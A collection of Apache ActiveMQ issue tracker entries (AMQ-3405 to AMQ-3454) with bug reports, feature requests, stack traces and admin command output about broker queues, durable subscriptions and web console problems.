message:ID:activemq-master-55970-1309958858075-2:32:1:1:3from queue: queue.FOO.BARINFO: Removing message:ID:activemq-master-55970-1309958858075-2:32:1:1:4from queue: queue.FOO.BARINFO: Removing message:ID:activemq-master-55970-1309958858075-2:32:1:1:5from queue: queue.FOO.BARINFO: Removing message:ID:activemq-master-55970-1309958858075-2:32:1:1:6from queue: queue.FOO.BARINFO: Removing message:ID:activemq-master-55970-1309958858075-2:32:1:1:7from queue: queue.FOO.BARINFO: Removing message:ID:activemq-master-55970-1309958858075-2:32:1:1:8from queue: queue.FOO.BARINFO: Removing message:ID:activemq-master-55970-1309958858075-2:32:1:1:9from queue: queue.FOO.BARINFO: Removing message:ID:activemq-master-55970-1309958858075-2:32:1:1:10from queue: queue.FOO.BAR(4) Purge with msgsel working with a patch:user@activemq-master:~/activemq$ activemq-admin browse --amqurl tcp://localhost:61616  --view JMSTimestamp --msgsel "JMSTimestamp<1310608391914" queue.FOO.BARJava Runtime: Sun Microsystems Inc. 1.6.0_22/home/y/libexec/jdk1.6.0/jre   Heap sizes: current=60800k  free=58535k  max=902976k     JVM args: -Dactivemq.classpath=""      -Djavax.net.ssl.trustStoreType=JKSACTIVEMQ_HOME: /home/y/libexec/activemqACTIVEMQ_BASE: /home/y/libexec/activemqJMS_HEADER_FIELD:JMSTimestamp = 1310608389116JMS_HEADER_FIELD:JMSTimestamp = 1310608389607JMS_HEADER_FIELD:JMSTimestamp = 1310608390266JMS_HEADER_FIELD:JMSTimestamp = 1310608390781JMS_HEADER_FIELD:JMSTimestamp = 1310608391390user@activemq-master:~/activemq$ ./activemq-admin purge  --msgsel "JMSTimestamp<1310608391914"  queue.FOO.BAR Java Runtime: Sun Microsystems Inc. 1.6.0_22/home/y/libexec/jdk1.6.0/jre   Heap sizes: current=60800k  free=58575k  max=902976k     JVM args: -Dactivemq.classpath=""      -Djavax.net.ssl.trustStoreType=JKSACTIVEMQ_HOME: /home/y/libexec/activemqACTIVEMQ_BASE: /home/y/libexec/activemqConnecting to JMX URL:service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmiINFO: Addobjects is :&#91;JMSTimestamp<1310608391914&#93;INFO: Removing message:ID:activemq-master-55970-1309958858075-2:33:1:1:1from queue: queue.FOO.BARINFO: Removing message:ID:activemq-master-55970-1309958858075-2:33:1:1:2from queue: queue.FOO.BARINFO: Removing message:ID:activemq-master-55970-1309958858075-2:33:1:1:3from queue: queue.FOO.BARINFO: Removing message:ID:activemq-master-55970-1309958858075-2:33:1:1:4from queue: queue.FOO.BARINFO: Removing message:ID:activemq-master-55970-1309958858075-2:33:1:1:5from queue: queue.FOO.BAR
issueID:AMQ-3405
type:Bug
changed files:
texts:DLQ messages moved/copied into original queue disappear after failing processing for a second time
1. Message in queue A fails enough times to be moved to the DLQ.2. We move/copy the message back to queue A to attempt reprocessing. Invoking the retry operation from JMX can also be used.3. The consumer once again fails to consume the message greater than the max number of times.4. The message is not put back into the DLQ. If it was moved rather than copied, it means we have a message that was never successfully consumed, but has nevertheless disappeared.This is all with the default ActiveMQ settings, though I tried adjusted the DLQ configuration to support both expired and non-persistent messages.I found this posting which seems to indicate the same issue I am seeing: http://www.mail-archive.com/users@activemq.apache.org/msg09683.html. One difference that I am seeing is that restarting ActiveMQ does not cause the message to show up in the DLQ again. Once it is lost, it is lost forever.To replicate this, I believe you can use a consumer that just fails on every invocation.One interesting thing is that if I put a message into the DLQ directly, then move it to a queue with a consumer, it will end up in the DLQ again as you would expect. If I then move the DLQ message back to the original queue, it will then show the bevahiour outlined above.
issueID:AMQ-3406
type:Improvement
changed files:TransportConnector.java
texts:Enable BrokerServiceAware support for DiscoveryAgent
Please add BrokerServiceAware support for DiscoveryAgent.You need to change createDiscoveryAgent method on org.apache.activemq.broker.TransportConnector    protected DiscoveryAgent createDiscoveryAgent() throws IOException {        if (discoveryUri != null) {            DiscoveryAgent agent = DiscoveryAgentFactory.createDiscoveryAgent(discoveryUri);            if( agent!=null && agent instanceof BrokerServiceAware ) {                ((BrokerServiceAware)agent).setBrokerService(brokerService);            }            return agent;        }        return null;    }Thx
issueID:AMQ-3408
type:New Feature
changed files:
texts:Remove inactive durable subscribers after certain timeout
The broker (if configured so) should automatically remove inactive durable subscribers that haven"t been active for the given amount of time. It will ease managing durable subscriptions and release broker resources (store usage and such).
issueID:AMQ-3410
type:Improvement
changed files:AbstractAmqCommand.java
texts:AbstractAmqCommand should allow the connection factory to be changed.
AbstractAmqCommand only allows an ActiveMQConnectionFactory to be used.  I"ve got a custom factory that I would like to be able to use from the command line interface.I"d like to see:get/setFactory implemented on AbstractAmqCommand, as well as some sort of method to override the connection factory being used.  I"m thinking along the lines of:--factory com.yahoo.activemq.YahooActiveMQConnectionFactoryThen if the --factory option is set, then this class will be implemented and used, otherwise ActiveMQConnectionFactory.I"ll attach a patch shortly for this.
issueID:AMQ-3411
type:Improvement
changed files:AmqBrowseCommand.java
AbstractAmqCommand.java
texts:Admin commands which take --amqurl should accept --user and --pass options
While using the fix for AMQ-3410, I realized that username and password are not available to be passed via command line.I"ll add a new parameter --user and --pass to allow username and password to be passed when --amqurl is passed.
issueID:AMQ-3412
type:Improvement
changed files:
texts:activemq-camel bundle dosen&#39;t need to export the package of META-INF.services.org.apache.camel
As the camel-core has an activator to load the type converter, we don"t need to expor the package in the camel-activemq bundle.
issueID:AMQ-3414
type:Bug
changed files:InactivityMonitor.java
texts:InactiviryMonitor Async Task thread overflow when date changes
when I run my application, which starts a broker, and changes the date one month forward I get overflow of InactiviryMonitor Async Task threads.see attached thread dump, and activemq.xml file
issueID:AMQ-3415
type:Improvement
changed files:RssMessageRenderer.java
texts:Show message timestamp in the RSS pubDate field in web console
At the moment we show the date of the feed entry creation
issueID:AMQ-3417
type:Task
changed files:
texts:Upgrade Camel version to 2.8.0
Camel 2.8.0 doesn"t ship the camel-spring test jar by accident, so we need to update the activemq-camel component to use camel-test module.
issueID:AMQ-3422
type:Bug
changed files:
texts:BitArray serialization
Byte sized data are written as ints
issueID:AMQ-3426
type:Bug
changed files:AbstractRegion.java
texts:AbstractRegion.java has incorrect null check in contructor
The constructor for AbstractRegion has a null check that was meant for the destinationFactory but instead check the broker param a second time resulting in some dead code.          if (broker == null) {            throw new IllegalArgumentException("null destinationFactory");        }        this.destinationFactory = destinationFactory;
issueID:AMQ-3427
type:Bug
changed files:
texts:Activemq-trunk does not compile with JDK7
This is due to the maven-war-plugin, patch forthcoming.&#91;INFO&#93; Packaging webapp&#91;INFO&#93; ------------------------------------------------------------------------&#91;ERROR&#93; FATAL ERROR&#91;INFO&#93; ------------------------------------------------------------------------&#91;INFO&#93; Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor : Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor---- Debugging information ----message             : Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructorcause-exception     : com.thoughtworks.xstream.converters.reflection.ObjectAccessExceptioncause-message       : Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructorclass               : org.apache.maven.plugin.war.util.WebappStructurerequired-type       : org.apache.maven.plugin.war.util.WebappStructurepath                : /webapp-structureline number         : 1-------------------------------&#91;INFO&#93; ------------------------------------------------------------------------&#91;INFO&#93; Tracecom.thoughtworks.xstream.converters.ConversionException: Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor : Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor---- Debugging information ----message             : Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructorcause-exception     : com.thoughtworks.xstream.converters.reflection.ObjectAccessExceptioncause-message       : Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructorclass               : org.apache.maven.plugin.war.util.WebappStructurerequired-type       : org.apache.maven.plugin.war.util.WebappStructurepath                : /webapp-structureline number         : 1-------------------------------        at com.thoughtworks.xstream.core.TreeUnmarshaller.convert(TreeUnmarshaller.java:89)        at com.thoughtworks.xstream.core.AbstractReferenceUnmarshaller.convert(AbstractReferenceUnmarshaller.java:63)        at com.thoughtworks.xstream.core.TreeUnmarshaller.convertAnother(TreeUnmarshaller.java:76)        at com.thoughtworks.xstream.core.TreeUnmarshaller.convertAnother(TreeUnmarshaller.java:60)        at com.thoughtworks.xstream.core.TreeUnmarshaller.start(TreeUnmarshaller.java:137)        at com.thoughtworks.xstream.core.AbstractTreeMarshallingStrategy.unmarshal(AbstractTreeMarshallingStrategy.java:33)        at com.thoughtworks.xstream.XStream.unmarshal(XStream.java:923)        at com.thoughtworks.xstream.XStream.unmarshal(XStream.java:909)        at com.thoughtworks.xstream.XStream.fromXML(XStream.java:853)        at org.apache.maven.plugin.war.util.WebappStructureSerializer.fromXml(WebappStructureSerializer.java:73)        at org.apache.maven.plugin.war.AbstractWarMojo.buildWebapp(AbstractWarMojo.java:423)        at org.apache.maven.plugin.war.AbstractWarMojo.buildExplodedWebapp(AbstractWarMojo.java:394)        at org.apache.maven.plugin.war.WarMojo.performPackaging(WarMojo.java:195)        at org.apache.maven.plugin.war.WarMojo.execute(WarMojo.java:157)        at org.apache.maven.plugin.DefaultPluginManager.executeMojo(DefaultPluginManager.java:490)        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoals(DefaultLifecycleExecutor.java:694)        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoalWithLifecycle(DefaultLifecycleExecutor.java:556)        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoal(DefaultLifecycleExecutor.java:535)        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoalAndHandleFailures(DefaultLifecycleExecutor.java:387)        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeTaskSegments(DefaultLifecycleExecutor.java:348)        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.execute(DefaultLifecycleExecutor.java:180)        at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:328)        at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:138)        at org.apache.maven.cli.MavenCli.main(MavenCli.java:362)        at org.apache.maven.cli.compat.CompatibleMain.main(CompatibleMain.java:60)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)        at java.lang.reflect.Method.invoke(Method.java:601)        at org.codehaus.classworlds.Launcher.launchEnhanced(Launcher.java:315)        at org.codehaus.classworlds.Launcher.launch(Launcher.java:255)        at org.codehaus.classworlds.Launcher.mainWithExitCode(Launcher.java:430)        at org.codehaus.classworlds.Launcher.main(Launcher.java:375)Caused by: com.thoughtworks.xstream.converters.reflection.ObjectAccessException: Cannot construct org.apache.maven.plugin.war.util.WebappStructure as it does not have a no-args constructor        at com.thoughtworks.xstream.converters.reflection.PureJavaReflectionProvider.newInstance(PureJavaReflectionProvider.java:71)        at com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter.instantiateNewInstance(AbstractReflectionConverter.java:308)        at com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter.unmarshal(AbstractReflectionConverter.java:161)        at com.thoughtworks.xstream.core.TreeUnmarshaller.convert(TreeUnmarshaller.java:82)        ... 32 more
issueID:AMQ-3430
type:Bug
changed files:SessionPool.java
ActiveMQSession.java
texts:activemq-web: SessionPool.returnSession() should discard sessions that are closed.
In activemq.web project, SessionPool.returnSession() does not check if the session is still open. As long as the session isn"t null, its returned back to the pool.At least one customer reported a problem when using the web console for browsing a queue, where the session was already closed. javax.jms.IllegalStateException: The Session is closedat org.apache.activemq.ActiveMQSession.checkClosed(ActiveMQSession.java:722)at org.apache.activemq.ActiveMQSession.createQueue(ActiveMQSession.java:1141)at org.apache.activemq.web.QueueBrowseQuery.getQueue(QueueBrowseQuery.java:65)at org.apache.activemq.web.QueueBrowseQuery.createBrowser(QueueBrowseQuery.java:91)at org.apache.activemq.web.QueueBrowseQuery.getBrowser(QueueBrowseQuery.java:54)at sun.reflect.GeneratedMethodAccessor125.invoke(Unknown Source)at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)at java.lang.reflect.Method.invoke(Method.java:597)at javax.el.BeanELResolver.getValue(BeanELResolver.java:62)...Not sure what triggered the closure of the session, however once it is closed it should not be returned to the pool but be discarded. If its not discarded, then the pool will always return the closed session and any invocations on the session return an exception. Restarting the broker is the only remedy.
issueID:AMQ-3431
type:Improvement
changed files:TransactionBroker.java
TopicRegion.java
RegionBroker.java
Queue.java
TempTopic.java
TempQueue.java
texts:Guard debug logging
Guard debug() calls with appropriate isDebugEnabled() to prevent unmarshmaling messages when that"s not needed.
issueID:AMQ-3434
type:Bug
changed files:
texts:Contention in PLIist  creation results in NPE on load - FilePendingMessageCursor
Ocassional ocurrance of stack trace2011-06-30 16:02:09,903 [127.0.0.1:50524] ERROR FilePendingMessageCursor       - Caught an IO Exception getting the DiskList 98_PendingCursor:loadq-3java.lang.NullPointerException at org.apache.kahadb.index.ListIndex.loadNode(ListIndex.java:203) at org.apache.kahadb.index.ListIndex.load(ListIndex.java:75) at org.apache.activemq.store.kahadb.plist.PListStore$1.execute(PListStore.java:219) at org.apache.kahadb.page.Transaction.execute(Transaction.java:729) at org.apache.activemq.store.kahadb.plist.PListStore.getPList(PListStore.java:216) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:454) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.flushToDisk(FilePendingMessageCursor.java:432) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:217) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:193) at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1629) at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:720) at org.apache.activemq.broker.region.Queue.send(Queue.java:652) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:379) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:523) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:304) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) at org.apache.activemq.broker.UserIDBroker.send(UserIDBroker.java:56) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:468) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:316) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:81) at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:140) at org.apache.activemq.transport.stomp.ProtocolConverter.onStompSend(ProtocolConverter.java:257) at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:178) at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:70) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:221) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:203) at java.lang.Thread.run(Thread.java:662)2011-06-30 16:02:09,912 [127.0.0.1:50524] ERROR FilePendingMessageCursor       - Caught an Exception adding a message: ActiveMQBytesMessage {commandId = 19796, responseRequired = false, messageId = ID:bigmacli-40948-1309463846336-2:105:-1:1:19794, originalDestination = null, originalTransactionId = null, producerId = ID:bigmacli-40948-1309463846336-2:105:-1:1, destination = queue://loadq-3, transactionId = null, expiration = 0, timestamp = 1309464129898, arrival = 0, brokerInTime = 1309464129898, brokerOutTime = 0, correlationId = null, replyTo = null, persistent = false, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = org.apache.activemq.util.ByteSequence@665e2517, marshalledProperties = null, dataStructure = null, redeliveryCounter = 0, size = 0, properties = null, readOnlyProperties = true, readOnlyBody = true, droppable = false} ActiveMQBytesMessage{ bytesOut = null, dataOut = null, dataIn = null } first to FilePendingMessageCursor java.lang.RuntimeException: java.lang.NullPointerException at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:457) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.flushToDisk(FilePendingMessageCursor.java:432) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:217) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:193) at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1629) at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:720) at org.apache.activemq.broker.region.Queue.send(Queue.java:652) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:379) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:523) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:304) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) at org.apache.activemq.broker.UserIDBroker.send(UserIDBroker.java:56) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:468) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:316) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:81) at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:140) at org.apache.activemq.transport.stomp.ProtocolConverter.onStompSend(ProtocolConverter.java:257) at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:178) at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:70) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:221) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:203) at java.lang.Thread.run(Thread.java:662)Caused by: java.lang.NullPointerException at org.apache.kahadb.index.ListIndex.loadNode(ListIndex.java:203) at org.apache.kahadb.index.ListIndex.load(ListIndex.java:75) at org.apache.activemq.store.kahadb.plist.PListStore$1.execute(PListStore.java:219) at org.apache.kahadb.page.Transaction.execute(Transaction.java:729) at org.apache.activemq.store.kahadb.plist.PListStore.getPList(PListStore.java:216) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.getDiskList(FilePendingMessageCursor.java:454) ... 28 more 2011-06-30 16:02:44,121 [Queue:loadq-9  ] ERROR Queue                          - Failed to page in more queue messages java.util.NoSuchElementException: Chunk stream does not exist, page: 63122 is marked free at org.apache.kahadb.index.ListNode$ListIterator.nextFromNextListNode(ListNode.java:149) at org.apache.kahadb.index.ListNode$ListIterator.hasNext(ListNode.java:160) at org.apache.activemq.store.kahadb.plist.PList$PListIterator.hasNext(PList.java:203) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.hasNext(FilePendingMessageCursor.java:496) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.hasNext(FilePendingMessageCursor.java:288) at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1725) at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1944) at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1452) at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98) at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)Caused by: java.io.EOFException: Chunk stream does not exist, page: 63122 is marked free at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:456) at org.apache.kahadb.page.Transaction$2.<init>(Transaction.java:433) at org.apache.kahadb.page.Transaction.openInputStream(Transaction.java:430) at org.apache.kahadb.page.Transaction.load(Transaction.java:406) at org.apache.kahadb.page.Transaction.load(Transaction.java:363) at org.apache.kahadb.index.ListIndex.loadNode(ListIndex.java:201) at org.apache.kahadb.index.ListNode$ListIterator.nextFromNextListNode(ListNode.java:147) ... 9 more 2011-06-30 16:02:49,401 [Queue:loadq-4  ] ERROR Queue                          - Failed to page in more queue messages java.util.NoSuchElementException: Could not locate data file /lab/activemq-5.5.0-fuse-00-27/data/broker/tmp_storage/db-3.log at org.apache.activemq.store.kahadb.plist.PList$PListIterator.next(PList.java:213) at org.apache.activemq.store.kahadb.plist.PList$PListIterator.next(PList.java:192) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.next(FilePendingMessageCursor.java:501) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.next(FilePendingMessageCursor.java:485) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.next(FilePendingMessageCursor.java:296) at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1726) at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1944) at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1452) at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98) at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)Caused by: java.io.IOException: Could not locate data file /lab/activemq-5.5.0-fuse-00-27/data/broker/tmp_storage/db-3.log at org.apache.kahadb.journal.Journal.getDataFile(Journal.java:350) at org.apache.kahadb.journal.Journal.read(Journal.java:597) at org.apache.activemq.store.kahadb.plist.PListStore.getPayload(PListStore.java:367) at org.apache.activemq.store.kahadb.plist.PList$PListIterator.next(PList.java:211) ... 9 more
issueID:AMQ-3435
type:Bug
changed files:TransportConnection.java
texts:Connection is taking a long time to close warning and  hung close thread
Info message in the log: The connection to "XXX" is taking a long time to shutdown.thread dump reveals call to stop from start without a relevant state change:INFO   | jvm 1    | 2011/07/25 13:42:01 |    java.lang.Thread.State: TIMED_WAITING (parking)INFO   | jvm 1    | 2011/07/25 13:42:01 | at sun.misc.Unsafe.park(Native Method)INFO   | jvm 1    | 2011/07/25 13:42:01 | - parking to wait for <0x00002aaab557eee8> (a java.util.concurrent.CountDownLatch$Sync)INFO   | jvm 1    | 2011/07/25 13:42:01 | at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:198)INFO   | jvm 1    | 2011/07/25 13:42:01 | at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedNanos(AbstractQueuedSynchronizer.java:947)INFO   | jvm 1    | 2011/07/25 13:42:01 | at java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireSharedNanos(AbstractQueuedSynchronizer.java:1339)INFO   | jvm 1    | 2011/07/25 13:42:01 | at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:253)INFO   | jvm 1    | 2011/07/25 13:42:01 | at org.apache.activemq.broker.TransportConnection.stop(TransportConnection.java:936)INFO   | jvm 1    | 2011/07/25 13:42:01 | at org.apache.activemq.broker.TransportConnection.start(TransportConnection.java:920)INFO   | jvm 1    | 2011/07/25 13:42:01 | at org.apache.activemq.broker.TransportConnector$1$1.run(TransportConnector.java:217)INFO   | jvm 1    | 2011/07/25 13:42:01 | at java.lang.Thread.run(Thread.java:619)
issueID:AMQ-3436
type:Improvement
changed files:
texts:Support Prioritization Of Messages Pending Dispatch
ActiveMQ does not deliver messages in priority order when the following conditions are true:1.  A consumer has prefetch set to one (or zero).2.  The consumer is created (consumerSession.createConsumer) prior to message delivery3.  Large maxPageSize is configuredThe fix is to modify org.apache.activemq.broker.region.Queue to use a PrioritizationPendingList for the message in "pagedInPendingDispatch" so they are dispatched in priority order.A test case reproducing the issue is included.The patched file deltas are included.
issueID:AMQ-3438
type:Improvement
changed files:
texts:Make use of remote port in Connection MBeanNames optional, useful when ephemeral range cycles quickly
With fast connection close/creation (like stomp) the client side ephemeral port range can result in duplicate mbean names when close is async. Potential of failed mbean registration due to port reuse.DEBUG ManagedTransportConnection - Failure reason: javax.management.InstanceAlreadyExistsException: org.apache.activemq:BrokerName=XXXXXX,Type=Connection,ConnectorName=stomp,ViewType=address,Name=/X.X.X.X_52170Make the registration of an address type mbean configurable so that this case can be avoided. In the main, it is handy to see the remote address in the mbean name, so the default should be to use the remote port. Just the client Id (which default to the connection id, will be used in the mbean name) when use of remote port is not allowed.
issueID:AMQ-3439
type:Improvement
changed files:NetworkConnectorViewMBean.java
NetworkConnectorView.java
texts:NetworkConnectorViewMBean doesn&#39;t expose suppressDuplicateQueueSubscriptions and suppressDuplicateTopicSubscriptions
i can neither view nor modify the the state of NetworkConnector"s suppressDuplicateQueueSubscriptions and suppressDuplicateTopicSubscriptions attributes via jmx, which would be useful in troubleshooting the behavior of durable subscriptions after a network outage.
issueID:AMQ-3442
type:Improvement
changed files:
texts:Use real durable sub key as MBean name for inactive durable sub and improve metrics, fix inflight count on deactivate
A few issues: An inactive durable subscription uses a type of "false" which is not intuitive. It should reuse the same subscription key from when it was active. The inflight metric on a topic is not aware of deactivation with pending messages so keeps incrementing. An offline sub with keepDurableSubsActive=false does not get all messages on reactivation.
issueID:AMQ-3445
type:Bug
changed files:
texts:jdbcPersistenceAdapter will lose existing queues after a broker restart
When using jdbcPersistenceAdapter, if you restart the broker queues do not show up until they are manually created or a consumer re-connects. This is especially a problem for Virtual Topic consumers - for Virtual Topic consumers once the queue is created (and thereby subscribing to the virtual topic), they should get all messages published to the topic until consumer explicitly remove subscription by deleting the queue. With KahaDB this works correctly but not with jdbcPersistenceAdapter. Tried both 5.4.2 and 5.5 and both have the same issue.To reproduce:1. Setup broker using jdbcPersistenceAdapter 2. Go to web console and create a queue: Consumer.MyApp.VirtualTopic.FOO3. Go to topics page and create a topic: VirtualTopic.FOO4. Send a message with Persistent Delivery to the topic5. Verify queue has the message6. Restart the broker7. BUG: queue does not show up8. Go to topics page and repeat steps 3 & 49. repeat step 210. BUG: only the first message shows up in the queue.Do the same test on KahaDB and queue shows up in step 7 (and because of that) you get both messages in step 10.
issueID:AMQ-3447
type:Bug
changed files:MessageListenerServlet.java
texts:When MessageListenerServlet is running under servlet3, the continuation is not timing out.
In MessageListenerServlet.java          if (message == null && client.getListener().getUndeliveredMessages().size() == 0) {                Continuation continuation = ContinuationSupport.getContinuation(request);                if (continuation.isExpired()) {                    response.setStatus(HttpServletResponse.SC_OK);                    StringWriter swriter = new StringWriter();                    PrintWriter writer = new PrintWriter(swriter);                    writer.println("<ajax-response>");                    writer.print("</ajax-response>");                    writer.flush();                    String m = swriter.toString();                    response.getWriter().println(m);                                         return;                }                continuation.setTimeout(timeout);                continuation.suspend();                LOG.debug( "Suspending continuation " + continuation );                // Fetch the listeners                AjaxListener listener = client.getListener();                listener.access();                // register this continuation with our listener.                listener.setContinuation(continuation);                return;            }Based on above code, the continuation is expected to be expired after given timeout when there is no message available for the ajax client and the ajax client will then receive an "empty" message. However based on the servlet 3 Continuation implementation in jetty (Servlet3Continuation.java) the only place where the continuation is set to expire is within the below method (there is a bug in this method as well). public void addContinuationListener(final ContinuationListener listener)    {        AsyncListener wrapped = new AsyncListener()        {            public void onComplete(final AsyncEvent event) throws IOException            {                listener.onComplete(Servlet3Continuation.this);            }            public void onError(AsyncEvent event) throws IOException            {                listener.onComplete(Servlet3Continuation.this);            }            public void onStartAsync(AsyncEvent event) throws IOException            {                event.getAsyncContext().addListener(this);            }            public void onTimeout(AsyncEvent event) throws IOException            {                _expired=true;                listener.onTimeout(Servlet3Continuation.this);            }        };        if (_context==null)            _context.addListener(wrapped);        else            _listeners.add(wrapped);    }Without adding a listener the continuation will never be set to expire, therefore the "empty" response is never sent back to the client, the connection from the client is resumed and suspended over and over again until the connection is aborted by client or there is a message available.
issueID:AMQ-3449
type:Improvement
changed files:InactivityMonitor.java
texts:Add Stomp v1.1 support
Stomp v1.1 spec was finalized so we should add support for it to AMQ.  This adds support for connection inactivity monitoring for Stomp clients so there should be less stale stomp connections for Stomp v1.1 clients that enable heart beats.  Also adds support for Queue browsing via stomp v1.1 clients that send the "browser:true" header in their subscription command.NACK Messages are also now supported in Stomp v1.1
issueID:AMQ-3451
type:Bug
changed files:VMTransport.java
texts:Tomcat 6.0.32 complains that ActiveMQ 5.5 doesn&#39;t shutdown a thread
Every time when restarting web application in Tomcat Manager I get messages:SEVERE: The web application &#91;/sms&#93; appears to have started a thread named &#91;ActiveMQ Task-3&#93; but has failed to stop it. This is very likely to create a memory leak.With every restart PermGen space is increased and finally i got OutOfMemory error for PermGen space.I use Spring DefaultMessageListenerContainer, and it"s shutdown method closes properly receivers threads. What is "ActiveMQ Task-3" thread and how to close it properly ?
issueID:AMQ-3454
type:Bug
changed files:
texts:Contention on a mutex during a stress when using SimpleAuthenticationPlugin
